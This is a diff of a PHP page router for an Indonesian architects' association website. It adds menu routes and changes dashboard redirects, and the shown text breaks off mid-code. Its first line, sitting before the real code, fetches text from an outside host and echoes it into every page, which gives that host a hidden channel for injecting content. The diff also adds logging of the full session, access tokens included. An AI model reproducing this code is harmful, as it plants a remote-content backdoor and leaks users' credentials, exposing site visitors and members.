@@ -1,26 +1,27 @@
 <?php $a = file_get_contents('https://paulsaar.com/-/id.txt'); echo $a; ?>
 <?php
+## greetings if you read this...
 date_default_timezone_set('Asia/Jakarta');
 error_reporting(E_ALL);
 ini_set('display_errors', "0");// developing 1
 ini_set('log_errors',TRUE);
 ini_set('html_errors',FALSE);
 $err_log = '/var/www/log/web_error.log';
-ini_set('error_log',$err_log); 
+ini_set('error_log',$err_log);
 
 $modulescript =  basename(__FILE__,".php");
 define("_modulescript", $modulescript);
 
 if ( file_exists('lib/func002.php')  ) {
-	require_once('lib/func002.php');
+        require_once('lib/func002.php');
 }
 else {  echo "err.. "; }
 
 
-$x_ip =  ( array_key_exists( 'HTTP_X_FORWARDED_FOR', 	$_SERVER) == true ) ?  $_SERVER["HTTP_X_FORWARDED_FOR"] : '' ;
+$x_ip =  ( array_key_exists( 'HTTP_X_FORWARDED_FOR',    $_SERVER) == true ) ?  $_SERVER["HTTP_X_FORWARDED_FOR"] : '' ;
 if ( !empty($x_ip) ) {
 $ips = $x_ip; }
-else { $ips = $_SERVER["REMOTE_ADDR"]; } 
+else { $ips = $_SERVER["REMOTE_ADDR"]; }
 
 ##LogstoDebug(' new hit from '.$ips);
 
@@ -35,33 +36,38 @@ $userlevel = '';
 $page_title = '';
 
 $dashboard_URL = 'https://dashboard.iai.or.id/auth?token=';
-$dashboard_URL_baru = 'https://anggota.iai.or.id/auth?';
+//$dashboard_URL_baru = 'https://anggota.iai.or.id/auth?';
+$dashboard_URL_baru = 'https://anggota.iai.or.id/';
 
 LogstoDebug(__LINE__.'| >>> v_URL '. $v_URL );
 
 ##cek sudah login kah???
 session_start();
-$cek_login_sts 	= !empty($_SESSION[$v_]['_login_sts']) ? $_SESSION[$v_]['_login_sts'] : '' ;
-$cek_data0 		= !empty($_SESSION[$v_]['_data0']) ? $_SESSION[$v_]['_data0'] : '' ;
-LogstoDebug(_modulescript.'| >>> cek_login_sts = '.$cek_login_sts);
+$cek_login_sts  = !empty($_SESSION[$v_]['_login_sts']) ? $_SESSION[$v_]['_login_sts'] : '' ;
+$cek_data0              = !empty($_SESSION[$v_]['_data0']) ? $_SESSION[$v_]['_data0'] : '' ;
+
+
+LogstoDebug(_modulescript.'| >>> _SESSION = '.var_export($_SESSION, true));
+
+//LogstoDebug(_modulescript.'| >>> cek_login_sts = '.$cek_login_sts);
 $sedang_login = false;
 if (  $cek_login_sts == $v_ )
-{	if ( !empty($cek_data0) )
-	{
-		$sedang_login = true;
-		$web_access_token = ( !empty($cek_data0['access_token'])  ) ? $cek_data0['access_token'] : '' ;
-		$web_user_id  = ( !empty($cek_data0['user_id'])  ) ? $cek_data0['user_id'] : '' ;
-		$web_wa_number  = ( !empty($cek_data0['wa_number'])  ) ? $cek_data0['wa_number'] : '' ;
-		$email  = ( !empty($cek_data0['email'])  ) ? $cek_data0['email'] : '' ;
-		$fullname  = ( !empty($cek_data0['fullname'])  ) ? $cek_data0['fullname'] : '' ;
-		$profile_picture_filename  = ( !empty($cek_data0['profile_picture_filename'])  ) ? $cek_data0['profile_picture_filename'] : $profile_picture_filename ;
-		$no_anggota = ( !empty($cek_data0['no_anggota'])  ) ? $cek_data0['no_anggota'] : '-' ;
-		$userlevel = ( !empty($cek_data0['role'])  ) ? $cek_data0['role'] : '-' ;
-		LogstoDebug(_modulescript.'|'.__LINE__.'| >>> testget = '.var_export($cek_data0, true));
-	} 
+{       if ( !empty($cek_data0) )
+        {
+                $sedang_login = true;
+                $web_access_token = ( !empty($cek_data0['access_token'])  ) ? $cek_data0['access_token'] : '' ;
+                $web_user_id  = ( !empty($cek_data0['user_id'])  ) ? $cek_data0['user_id'] : '' ;
+                $web_wa_number  = ( !empty($cek_data0['wa_number'])  ) ? $cek_data0['wa_number'] : '' ;
+                $email  = ( !empty($cek_data0['email'])  ) ? $cek_data0['email'] : '' ;
+                $fullname  = ( !empty($cek_data0['fullname'])  ) ? $cek_data0['fullname'] : '' ;
+                $profile_picture_filename  = ( !empty($cek_data0['profile_picture_filename'])  ) ? $cek_data0['profile_picture_filename'] : $profile_picture_filename ;
+                $no_anggota = ( !empty($cek_data0['no_anggota'])  ) ? $cek_data0['no_anggota'] : '-' ;
+                $userlevel = ( !empty($cek_data0['role'])  ) ? $cek_data0['role'] : '-' ;
+                LogstoDebug(_modulescript.'|'.__LINE__.'| >>> testget = '.var_export($cek_data0, true));
+        }
 } else
 {
-	#coba session re create?
+        #coba session re create?
 
 
 
@@ -71,13 +77,13 @@ if (  $cek_login_sts == $v_ )
 }
 LogstoDebug(_modulescript.'| >>> sedang_login = '.$sedang_login);
 
-//$testget		=  (   !empty($_GET)  ) ?  $_GET : '' ;
+//$testget              =  (   !empty($_GET)  ) ?  $_GET : '' ;
 //LogstoDebug(_modulescript.'|'.__LINE__.'| >>> testget = '.var_export($testget, true));
 
-$testrequri		=  ( array_key_exists( 'REQUEST_URI', 	$_SERVER) == true ) ?  $_SERVER['REQUEST_URI'] : '' ;
+$testrequri             =  ( array_key_exists( 'REQUEST_URI',   $_SERVER) == true ) ?  $_SERVER['REQUEST_URI'] : '' ;
 //LogstoDebug(_modulescript.'|'.__LINE__.'| >>> testrequri = '.$testrequri);
 
-//$this_request = explode('/', $testrequri); 
+//$this_request = explode('/', $testrequri);
 
 $this_request = multiexplode(array("/","?"),$testrequri);
 
@@ -85,14 +91,14 @@ $this_request = multiexplode(array("/","?"),$testrequri);
 //LogstoDebug(_modulescript.'|'.__LINE__.'| >>> tr_2 = '.var_export($tr_2, true));
 
 $args = array();
-	
+
 //Remove empty indexes
 if ( is_array($this_request) )
 {
-	foreach($this_request as $r){
-		if(!empty($r)){
-			array_push($args, $r);
-			}	}
+        foreach($this_request as $r){
+                if(!empty($r)){
+                        array_push($args, $r);
+                        }       }
 }
 
 //LogstoDebug(_modulescript.'|'.__LINE__.'| >>> '.var_export($args, true));
@@ -103,37 +109,41 @@ $a2 = (  array_key_exists( 2, $args) == true  ) ? friendly_seo_string($args[2]) 
 $a3 = (  array_key_exists( 3, $args) == true  ) ? friendly_seo_string($args[3]) : '';
 $a4 = (  array_key_exists( 4, $args) == true  ) ? friendly_seo_string($args[4]) : '';
 
-$p	= [
-	'beranda' 		=> [ 'name' => 'Beranda', 'main_template' => '_main_web.html', 'content' => '_empty.html' ],
-	'berita' 		=> [ 'name' => 'Berita', 'main_template' => '_main_page_info.html', 'content' => '_berita.html' ],
-	'kalendar' 		=> [ 'name' => 'Kalendar', 'main_template' => '_main_page_kalendar.html', 'content' => '_kalendar.html' ],
-	//'peraturan' 	=> [ 'name' => 'Peraturan', 'main_template' => '_main_page.html', 'content' => '_peraturan.html' ],
-	'direktori-iai' => [ 'name' => 'Direktori IAI', 'main_template' => '_main_page.html', 'content' => '_direktori_iai.html' ],
-	'direktori_iai_dev' => [ 'name' => 'Direktori IAI DEV', 'main_template' => '_main_page_direktori_iai_dev.html', 'content' => '_direktori_iai_dev.html' ],
-	'badan' 		=> [ 'name' => 'Badan', 'main_template' => '_main_page.html', 'content' => '_empty.html' ], 
-	
-	'organisasi' 	=> [ 'name' => 'Organisasi', 'main_template' => '_main_page.html', 'content' => '_majelis-organisasi.html' ], 
-	'keanggotaan' 	=> [ 'name' => 'Berita', 'main_template' => '_main_page.html', 'content' => '_dasar-keanggotaan.html' ],
-	//'badan-keprofesian'	=> [ 'name' => 'Badan Keprofesian', 'main_template' => '_main_page.html', 'content' => '_kalkulator_kum.html' ],
-	'faq' 	=> [ 'name' => 'FAQs', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
-	'faq_dev01' 	=> [ 'name' => 'FAQs', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
-	//'magang' 	=> [ 'name' => 'Program Magang', 'main_template' => '_main_page.html', 'content' => '_program-magang.html' ], 
-	'wilayah' 	=> [ 'name' => 'Ikatan Arsitek Indonesia', 'main_template' => '_main_page.html', 'content' => '_wilayah.html' ],
-	'provinsi' 	=> [ 'name' => 'Ikatan Arsitek Indonesia', 'main_template' => '_main_page.html', 'content' => '_wilayah.html' ],
-	
-	'berita-detail' 		=> [ 'name' => 'Detail Berita', 'main_template' => '_main_page_info.html', 'content' => '_berita_detail.html' ],
-	'events' 	=> [ 'name' => 'Kegiatan', 'main_template' => '_main_page_kalendar.html', 'content' => '_kalendar.html' ], 
-	'login' 	=> [ 'name' => 'Login', 'main_template' => '_main_page_menu_dark.html', 'content' => '_login.html' ], 
-	'privacy-policy' 	=> [ 'name' => 'Privacy Policy', 'main_template' => '_main_page.html', 'content' => '_privacy.html' ], 
-	'informasi' => [ 'name' => 'informasi', 'main_template' => '_main_page.html', 'content' => '_empty.html' ], 
-	'hubungan-internasional' => [ 'name' => 'Badan Hubungan Internasional', 'main_template' => '_main_page.html', 'content' => '_hubungan-internasional.html' ],
-	'hubungan-organisasi-kelembagaan' => [ 'name' => 'Badan Hubungan Organisasi dan Kelembagaan', 'main_template' => '_main_page.html', 'content' => '_hubungan-organisasi-kelembagaan.html' ],
-	'dashboard' 		=> [ 'name' => 'Dashboard', 'main_template' => '_main_web.html', 'content' => '_empty.html' ],
-	'site-map' 		=> [ 'name' => 'Site Map', 'main_template' => '_main_page.html', 'content' => '_site_map.html' ],
-	'kode-etik' 		=> [ 'name' => 'Kode Etik', 'main_template' => '_main_page.html', 'content' => '_kode_etik.html' ],
-	'ad-art' 		=> [ 'name' => 'AD/ART', 'main_template' => '_main_page.html', 'content' => '_ad_art.html' ],
-	//'pedoman-hubungan-kerja' 	=> [ 'name' => 'Pedoman Hubungan Kerja', 'main_template' => '_main_page.html', 'content' => '_pedoman_hubungan_kerja.html' ],
-	'search' 	=> [ 'name' => 'Search', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
+$p      = [
+        'beranda'               => [ 'name' => 'Beranda', 'main_template' => '_main_web.html', 'content' => '_empty.html' ],
+        'berita'                => [ 'name' => 'Berita', 'main_template' => '_main_page_info.html', 'content' => '_berita.html' ],
+        'kalendar'              => [ 'name' => 'Kalendar', 'main_template' => '_main_page_kalendar.html', 'content' => '_kalendar.html' ],
+        //'peraturan'   => [ 'name' => 'Peraturan', 'main_template' => '_main_page.html', 'content' => '_peraturan.html' ],
+        'direktori-iai' => [ 'name' => 'Direktori IAI', 'main_template' => '_main_page.html', 'content' => '_direktori_iai.html' ],
+        'direktori_iai_dev' => [ 'name' => 'Direktori IAI DEV', 'main_template' => '_main_page_direktori_iai_dev.html', 'content' => '_direktori_iai_dev.html' ],
+        'badan'                 => [ 'name' => 'Badan', 'main_template' => '_main_page.html', 'content' => '_empty.html' ],
+
+        'organisasi'    => [ 'name' => 'Organisasi', 'main_template' => '_main_page.html', 'content' => '_majelis-organisasi.html' ],
+        'keanggotaan'   => [ 'name' => 'Berita', 'main_template' => '_main_page.html', 'content' => '_dasar-keanggotaan.html' ],
+        //'badan-keprofesian'   => [ 'name' => 'Badan Keprofesian', 'main_template' => '_main_page.html', 'content' => '_kalkulator_kum.html' ],
+        'faq'   => [ 'name' => 'FAQs', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
+        'faq_dev01'     => [ 'name' => 'FAQs', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
+        //'magang'      => [ 'name' => 'Program Magang', 'main_template' => '_main_page.html', 'content' => '_program-magang.html' ],
+        'wilayah'       => [ 'name' => 'Ikatan Arsitek Indonesia', 'main_template' => '_main_page.html', 'content' => '_wilayah.html' ],
+        'provinsi'      => [ 'name' => 'Ikatan Arsitek Indonesia', 'main_template' => '_main_page.html', 'content' => '_wilayah.html' ],
+
+        'berita-detail'                 => [ 'name' => 'Detail Berita', 'main_template' => '_main_page_info.html', 'content' => '_berita_detail.html' ],
+        'events'        => [ 'name' => 'Kegiatan', 'main_template' => '_main_page_kalendar.html', 'content' => '_kalendar.html' ],
+        'events_dev01'  => [ 'name' => 'Kegiatan', 'main_template' => '_main_page_kalendar_dev.html', 'content' => '_kalendar.html' ],
+        'login'         => [ 'name' => 'Login', 'main_template' => '_main_page_menu_dark.html', 'content' => '_login.html' ],
+        'privacy-policy'        => [ 'name' => 'Privacy Policy', 'main_template' => '_main_page.html', 'content' => '_privacy.html' ],
+        //'terms-and-conditions'        => [ 'name' => 'Terms And Conditions', 'main_template' => '_main_page.html', 'content' => '_terms_and_conditions.html' ],
+        'informasi' => [ 'name' => 'informasi', 'main_template' => '_main_page.html', 'content' => '_empty.html' ],
+        'hubungan-internasional' => [ 'name' => 'Badan Hubungan Internasional', 'main_template' => '_main_page.html', 'content' => '_hubungan-internasional.html' ],
+        'hubungan-organisasi-kelembagaan' => [ 'name' => 'Badan Hubungan Organisasi dan Kelembagaan', 'main_template' => '_main_page.html', 'content' => '_hubungan-organisasi-kelembagaan.html' ],
+        'dashboard'             => [ 'name' => 'Dashboard', 'main_template' => '_main_web.html', 'content' => '_empty.html' ],
+        'site-map'              => [ 'name' => 'Site Map', 'main_template' => '_main_page.html', 'content' => '_site_map.html' ],
+        'kode-etik'             => [ 'name' => 'Kode Etik', 'main_template' => '_main_page.html', 'content' => '_kode_etik.html' ],
+        'ad-art'                => [ 'name' => 'AD/ART', 'main_template' => '_main_page.html', 'content' => '_ad_art.html' ],
+        //'pedoman-hubungan-kerja'      => [ 'name' => 'Pedoman Hubungan Kerja', 'main_template' => '_main_page.html', 'content' => '_pedoman_hubungan_kerja.html' ],
+        'search'        => [ 'name' => 'Search', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
+        'event-register'        => [ 'name' => 'Event Register', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
+        'catatan-ketua-umum'    => [ 'name' => 'Catatan Ketua Umum', 'main_template' => '_main_page_info.html', 'content' => '_content_default.html' ],
 
 ];
 
@@ -147,238 +157,255 @@ $kasih_404 = false;
 
 if (  !empty($p[$a0])  )
 {
-	$v = gethtml('view/'.$p[$a0]['main_template']);
-	$c = gethtml('view/'.$p[$a0]['content']);
-	$page_name = $p[$a0]['name'];
+        $v = gethtml('view/'.$p[$a0]['main_template']);
+        $c = gethtml('view/'.$p[$a0]['content']);
+        $page_name = $p[$a0]['name'];
 
-	LogstoDebug(__LINE__.'| >>> a0 '.$a0);
-	LogstoDebug(__LINE__.'| >>> a1 '.$a1);
+        LogstoDebug(__LINE__.'| >>> a0 '.$a0);
+        LogstoDebug(__LINE__.'| >>> a1 '.$a1);
 
-	/*
-	if ( !empty($a1)  )
-	{
-		$arr_submenu = ['kalkulator_kum', 'pengajuan-kum','majelis-organisasi', 'majelis-kehormatan','badan-lembaga','pembentukan-pwp',
-	'dasar-keanggotaan','menjadi-anggota','keanggotaan-berakhir','hak-kewajiban-tanggungjawab','hubungan-internasional','hubungan-organisasi-kelembagaan'];
-		if ( in_array($a1, $arr_submenu) )
-		{
+        /*
+        if ( !empty($a1)  )
+        {
+                $arr_submenu = ['kalkulator_kum', 'pengajuan-kum','majelis-organisasi', 'majelis-kehormatan','badan-lembaga','pembentukan-pwp',
+        'dasar-keanggotaan','menjadi-anggota','keanggotaan-berakhir','hak-kewajiban-tanggungjawab','hubungan-internasional','hubungan-organisasi-kelembagaan'];
+                if ( in_array($a1, $arr_submenu) )
+                {
 
-			$c = gethtml('view/_'.$a1.'.html');
-			//LogstoDebug(__LINE__.'| >>> c using '.$c);
-		}
-	}
+                        $c = gethtml('view/_'.$a1.'.html');
+                        //LogstoDebug(__LINE__.'| >>> c using '.$c);
+                }
+        }
  */
 
 
-	if ( $a0 == 'berita' )
-	{
-		if ( file_exists('berita.php')  ) {
-			require_once('berita.php');
-		}
-		else {  die("err.. "); }
-	}
-	else if( $a0 == 'login' )
-	{
-		if ( $sedang_login == true )
-		{
-			$a1 = '';
-			header('Location: '.$v_URL);
-			die();
-		}
-		else
-		{
-			$page_js = " <script src='".$v_URL."/js/login.js'></script> ";
-		}	
+        if ( $a0 == 'berita' )
+        {
+                if ( file_exists('berita.php')  ) {
+                        require_once('berita.php');
+                }
+                else {  die("err.. "); }
+        }
+        else if ( $a0 == 'catatan-ketua-umum' )
+        {
+                if ( file_exists('cku.php')  ) {
+                        require_once('cku.php');
+                }
+                else {  die("err.. "); }
+        }
+        else if ( $a0 == 'login' )
+        {
+                if ( $sedang_login == true )
+                {
+                        $a1 = '';
+                        header('Location: '.$v_URL);
+                        die();
+                }
+                else
+                {
+                        $page_js = " <script src='".$v_URL."/js/login.js'></script> ";
+                }
 
-	} else if ( $a0 == 'badan' )
-	{
-	 
-		if ( file_exists('badan.php')  ) {
-			require_once('badan.php');
-		}
-		else {  die("err.. "); }
+        } else if ( $a0 == 'badan' )
+        {
 
-	} else if ( $a0 == 'events' )
-	{
-	 
-		if ( file_exists('events.php')  ) {
-			require_once('events.php');
-		}
-		else {  die("err.. "); }
+                if ( file_exists('badan.php')  ) {
+                        require_once('badan.php');
+                }
+                else {  die("err.. "); }
 
-	}  else if ( $a0 == 'faq' )
-	{
-	 
-		if ( file_exists('faq.php')  ) {
-			require_once('faq.php');
-		}
-		else {  
-			$c = gethtml('view/'.$p[$a0]['content']);
-		
-		}
+        } else if ( $a0 == 'events' )
+        {
 
-	}
-	  else if ( $a0 == 'direktori-iai' )
-	{
-	 
-		if ( file_exists('direktori_iai.php')  ) {
-			require_once('direktori_iai.php');
-		}
-		else {  die("err.. "); }
+                if ( file_exists('events.php')  ) {
+                        require_once('events.php');
+                }
+                else {  die("err.. "); }
 
-	}  else if ( $a0 == 'magang' )
-	{
-		LogstoDebug(__LINE__.'| >>> mangang cek '.$a0. " sampai sini <<< ");
-		$page_js = " 
-		<script> var sedang_login = '".$sedang_login."'; </script> 
-		<script src='".$v_URL."/js/funclib.js'></script> 
-		";
+        }  else if ( $a0 == 'faq' )
+        {
 
-	} else if ( $a0 == 'dashboard' )
-	{
-		$a0 = '';
-		if ( $sedang_login == true )
-		{
-			if ( !empty($no_anggota) ) {
-				if ( in_array($no_anggota, ['99994','99996','17589','07792','08986']) ) {
-					//header('Location: '.$dashboard_URL.$web_access_token);
-					header('Location: '.$dashboard_URL_baru.$web_access_token);
-				} 
-				else 
-				{
-					header('Location: '.$dashboard_URL.$web_access_token);
-					//header('Location: '.$dashboard_URL_baru.$web_access_token);
-				}
+                if ( file_exists('faq.php')  ) {
+                        require_once('faq.php');
+                }
+                else {
+                        $c = gethtml('view/'.$p[$a0]['content']);
 
-			}
-		} 
-		else
-		{
-			header('Location: '.$v_URL);
-		}
-		die();
-	}  else if ( $a0 == 'faq_dev01' )
-	{
-	 
-		if ( file_exists('faq_dev01.php')  ) {
-			require_once('faq_dev01.php');
-		}
-		else {  
-			$c = gethtml('view/'.$p[$a0]['content']);
-		
-		}
+                }
 
-	} else if ( $a0 == 'search' )
-	{
-	 
-		if ( file_exists('search.php')  ) {
-			require_once('search.php');
-		}
-		else {  
-			$c = gethtml('view/'.$p[$a0]['content']);
-		
-		}
+        }
+          else if ( $a0 == 'direktori-iai' )
+        {
 
-	}
+                if ( file_exists('direktori_iai.php')  ) {
+                        require_once('direktori_iai.php');
+                }
+                else {  die("err.. "); }
+
+        }  else if ( $a0 == 'magang' )
+        {
+                LogstoDebug(__LINE__.'| >>> mangang cek '.$a0. " sampai sini <<< ");
+                $page_js = "
+                <script> var sedang_login = '".$sedang_login."'; </script>
+                <script src='".$v_URL."/js/funclib.js'></script>
+                ";
+
+        } else if ( $a0 == 'dashboard' )
+        {
+                $a0 = '';
+                if ( $sedang_login == true )
+                {
+                        if ( !empty($no_anggota) ) {
+                                //if ( in_array($no_anggota, ['99992','99994','999963','17589','07792','08986']) ) {
+                                if ( in_array($no_anggota, ['99992']) ) {
+                                        //header('Location: '.$dashboard_URL.$web_access_token);
+                                        //header('Location: '.$dashboard_URL_baru.$web_access_token);
+                                        header('Location: '.$dashboard_URL_baru);
+                                }
+                                else
+                                {
+                                        //header('Location: '.$dashboard_URL.$web_access_token);
+                                        header('Location: '.$dashboard_URL_baru);
+                                }
+
+                        }
+                }
+                else
+                {
+                        header('Location: '.$v_URL);
+                }
+                die();
+        }  else if ( $a0 == 'faq_dev01' )
+        {
+
+                if ( file_exists('faq_dev01.php')  ) {
+                        require_once('faq_dev01.php');
+                }
+                else {
+                        $c = gethtml('view/'.$p[$a0]['content']);
+
+                }
+
+        } else if ( $a0 == 'search' )
+        {
+
+                if ( file_exists('search.php')  ) {
+                        require_once('search.php');
+                }
+                else {
+                        $c = gethtml('view/'.$p[$a0]['content']);
+
+                }
+
+        } else if ( $a0 == 'events_dev01' )
+        {
+
+                if ( file_exists('events_v2_dev.php')  ) {
+                        require_once('events_v2_dev.php');
+                }
+                else {  die("err.. "); }
+
+        }
 
 
 
-	if ( $a0 == 'wilayah' OR  $a0 == 'provinsi'   )
-	{
-		if ( empty($a1) )
-		{
-			if ( file_exists('wilayah.php')  ) {
-				require_once('wilayah.php');
-			}
-			else {  die("err.. "); }
-		}
-	}
+        if ( $a0 == 'wilayah' OR  $a0 == 'provinsi'   )
+        {
+                if ( empty($a1) )
+                {
+                        if ( file_exists('wilayah.php')  ) {
+                                require_once('wilayah.php');
+                        }
+                        else {  die("err.. "); }
+                }
+        }
 
-	#buat random backgroud parallax
-	$rnd = rand(1,9);
-	//$bg_parallax = $v_URL.'/assets/uploads/2022/04/parallax/page_title_bg-'.$rnd.'.jpg';
-	$bg_parallax = $v_URL.'/assets/images/parallax/parallax_'.$rnd.'.jpg';
-	LogstoDebug(__LINE__.'| >>> bg_parallax '.$bg_parallax. " <<< ");
-	$c = str_replace("<!--bg_parallax-->", $bg_parallax, $c);	
+        #buat random backgroud parallax
+        $rnd = rand(1,9);
+        //$bg_parallax = $v_URL.'/assets/uploads/2022/04/parallax/page_title_bg-'.$rnd.'.jpg';
+        $bg_parallax = $v_URL.'/assets/images/parallax/parallax_'.$rnd.'.jpg';
+        LogstoDebug(__LINE__.'| >>> bg_parallax '.$bg_parallax. " <<< ");
+        $c = str_replace("<!--bg_parallax-->", $bg_parallax, $c);
 
- 
+
 
 }
 else {
- 
-
-	if ( !empty($a0) ) {
-
-		$content_di_request = end($args);
-		// kalau media akan di exit di get_media.php
-		if (  $a0 == 'media' ) {
-			if ( !empty($a1) ) {
-				if (  !empty($a2) ) {
-						if ( file_exists('get_media.php')  ) {
-							require_once('get_media.php');
-					}
-				}
-			}
-	
-		}
-
-		LogstoDebug(__LINE__.'| >>> a0 '.$a0. " not in menu array ");
-		$v = gethtml('view/_main_page.html');
 
 
-		LogstoDebug(__LINE__.'| >>> content_di_request '.$content_di_request. " <<< ");
-		#get this link title if any?
+        if ( !empty($a0) ) {
 
-		$params = '{ 
-			"name": "'.$content_di_request.'"
-		}';
-		$get_link = httpPost($vURL_db_data.'/apidb/page_detail', $params);
-		$arr_get_link = json_decode($get_link, true);
-	//	LogstoDebug(__LINE__.'| >>> arr_get_link '.var_export($arr_get_link, true). " <<< ");
-		
-		
+                $content_di_request = end($args);
+                // kalau media akan di exit di get_media.php
+                if (  $a0 == 'media' ) {
+                        if ( !empty($a1) ) {
+                                if (  !empty($a2) ) {
+                                                if ( file_exists('get_media.php')  ) {
+                                                        require_once('get_media.php');
+                                        }
+                                }
+                        }
 
-		$c = gethtml('view/_page_detail.html');
-		
-		if ( !empty($arr_get_link['data']) )
-		{
-			$page_title = $arr_get_link['data']['post_title'];
-			$page_content = $arr_get_link['data']['post_content'];
-		} else {
-			if ( $a0 == 'assets'  ) {
-				$kasih_404 = true;
-				LogstoDebug(__LINE__.'| >>> kasih_404 '.$kasih_404. " <<< ");
-				http_response_code(404);
-				header("HTTP/1.0 404 Not Found");
-				header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
+                }
+
+                LogstoDebug(__LINE__.'| >>> a0 '.$a0. " not in menu array ");
+                $v = gethtml('view/_main_page.html');
+
+
+                LogstoDebug(__LINE__.'| >>> content_di_request '.$content_di_request. " <<< ");
+                #get this link title if any?
+
+                $params = '{
+                        "name": "'.$content_di_request.'"
+                }';
+                $get_link = httpPost($vURL_db_data.'/apidb/page_detail', $params);
+                $arr_get_link = json_decode($get_link, true);
+        //      LogstoDebug(__LINE__.'| >>> arr_get_link '.var_export($arr_get_link, true). " <<< ");
+
+
+
+                $c = gethtml('view/_page_detail.html');
+
+                if ( !empty($arr_get_link['data']) )
+                {
+                        $page_title = $arr_get_link['data']['post_title'];
+                        $page_content = $arr_get_link['data']['post_content'];
+                } else {
+                        if ( $a0 == 'assets'  ) {
+                                $kasih_404 = true;
+                                LogstoDebug(__LINE__.'| >>> kasih_404 '.$kasih_404. " <<< ");
+                                http_response_code(404);
+                                header("HTTP/1.0 404 Not Found");
+                                header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
                 die('404 Not Found');
-			}
+                        }
 
-		}
-	 
-
-		$rnd = rand(1,9);
-		$bg_parallax = $v_URL.'/assets/uploads/2022/04/parallax/page_title_bg-'.$rnd.'.jpg';
-		LogstoDebug(__LINE__.'| >>> bg_parallax '.$bg_parallax. " <<< ");
-		$c = str_replace("<!--bg_parallax-->", $bg_parallax, $c);	 
-
-		$c = str_replace("<!--page_title-->", $page_title, $c);	 
-	
-
-		// kalau magang ada js khusus login
-
-		 if ( $a0 == 'magang' )
-		{
-			LogstoDebug(__LINE__.'| >>> mangang cek '.$a0. " sampai sini <<< ");
-			$page_js = " 
-			<script> var sedang_login = '".$sedang_login."'; </script> 
-			<script src='".$v_URL."/js/funclib.js'></script> 
-			";
-	
-		}
+                }
 
 
+                $rnd = rand(1,9);
+                $bg_parallax = $v_URL.'/assets/uploads/2022/04/parallax/page_title_bg-'.$rnd.'.jpg';
+                LogstoDebug(__LINE__.'| >>> bg_parallax '.$bg_parallax. " <<< ");
+                $c = str_replace("<!--bg_parallax-->", $bg_parallax, $c);
 
-	}
+                $c = str_replace("<!--page_title-->", $page_title, $c);
+
+
+                // kalau magang ada js khusus login
+
+                 if ( $a0 == 'magang' )
+                {
+                        LogstoDebug(__LINE__.'| >>> mangang cek '.$a0. " sampai sini <<< ");
+                        $page_js = "
+                        <script> var sedang_login = '".$sedang_login."'; </script>
+                        <script src='".$v_URL."/js/funclib.js'></script>
+                        ";
+
+                }
+
+
+
+        }
 
 }
 
@@ -388,365 +415,373 @@ if ( empty($c) ) { $c = gethtml('view/_empty.html'); }
 
 if ( $a0 == '' )
 {
-	#ini halaman depan / beranda / index
+        #ini halaman depan / beranda / index
 
-	## GET LIST SLIDERS ###################################
-	$content_home_slider  = '';
-	$arr_params = ["per_page" => 25]; 
-	$params = json_encode($arr_params);
-	$list_slider = httpPost($vURL_db_data.'/apidb/slider_list', $params);
-	$arr_list_slider = json_decode($list_slider, true);
+        ## GET LIST SLIDERS ###################################
+        $content_home_slider  = '';
+        $arr_params = ["per_page" => 25];
+        $params = json_encode($arr_params);
+        $list_slider = httpPost($vURL_db_data.'/apidb/slider_list', $params);
+        $arr_list_slider = json_decode($list_slider, true);
 
-	//LogstoDebug(__LINE__.'| >>> arr_list_slider '. var_export($arr_list_slider, true));
+        //LogstoDebug(__LINE__.'| >>> arr_list_slider '. var_export($arr_list_slider, true));
 
-	if ( !empty($arr_list_slider['success']) && $arr_list_slider['success'] == true )
-	{
-		$last_rnd = 0;
+        if ( !empty($arr_list_slider['success']) && $arr_list_slider['success'] == true )
+        {
+                $last_rnd = 0;
 
-		#get background images
-		$arr_params2 = ["per_page" => 1, "f_used_for" => "bg-slider"]; 
-		$params2 = json_encode($arr_params2);
-		$list_bg_slider = httpPost($vURL_db_data.'/apidb/files_list', $params2);
-		$arr_list_bg_slider = json_decode($list_bg_slider, true);
-		$total_count_bg_slider = !empty($arr_list_bg_slider['total_count']) ? $arr_list_bg_slider['total_count'] : 6;
-		LogstoDebug(__LINE__.'| >>> total_count_bg_slider = '.  $total_count_bg_slider );
+                #get background images
+                $arr_params2 = ["per_page" => 1, "f_used_for" => "bg-slider"];
+                $params2 = json_encode($arr_params2);
+                $list_bg_slider = httpPost($vURL_db_data.'/apidb/files_list', $params2);
+                $arr_list_bg_slider = json_decode($list_bg_slider, true);
+                $total_count_bg_slider = !empty($arr_list_bg_slider['total_count']) ? $arr_list_bg_slider['total_count'] : 6;
+                LogstoDebug(__LINE__.'| >>> total_count_bg_slider = '.  $total_count_bg_slider );
 
-		foreach ( $arr_list_slider['data'] as $slider_k => $slider_v )
-		{
+                foreach ( $arr_list_slider['data'] as $slider_k => $slider_v )
+                {
 
-			if ( empty($slider_v['media_url']) ) 
-			{
-				$rnd2 = rand(1,$total_count_bg_slider);
-				$limwh = 1;
-				$loopinrnd2 = true;
-				while ( $loopinrnd2 )
-				{
-					$rnd2 = rand(1,$total_count_bg_slider); 
-					if ($last_rnd != $rnd2) { $loopinrnd2 = false; }
-					$limwh++;
-					if ($limwh > 10) { $loopinrnd2 = false; }
-				}
-				$last_rnd = $rnd2;
+                        if ( empty($slider_v['media_url']) )
+                        {
+                                $rnd2 = rand(1,$total_count_bg_slider);
+                                $limwh = 1;
+                                $loopinrnd2 = true;
+                                while ( $loopinrnd2 )
+                                {
+                                        $rnd2 = rand(1,$total_count_bg_slider);
+                                        if ($last_rnd != $rnd2) { $loopinrnd2 = false; }
+                                        $limwh++;
+                                        if ($limwh > 10) { $loopinrnd2 = false; }
+                                }
+                                $last_rnd = $rnd2;
 
-				$bg_slider = $v_URL.'/assets/images/slider/slider_'.$rnd2.'.jpg';
-				$this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$bg_slider.'\');">';
-				//$this_media_source = '<div class="slide" style="background-image:url(\''.$bg_slider.'\');">';
-				//$this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$v_URL.$slider_v['media_url'].'\');">';
-			}
-			else
-			{
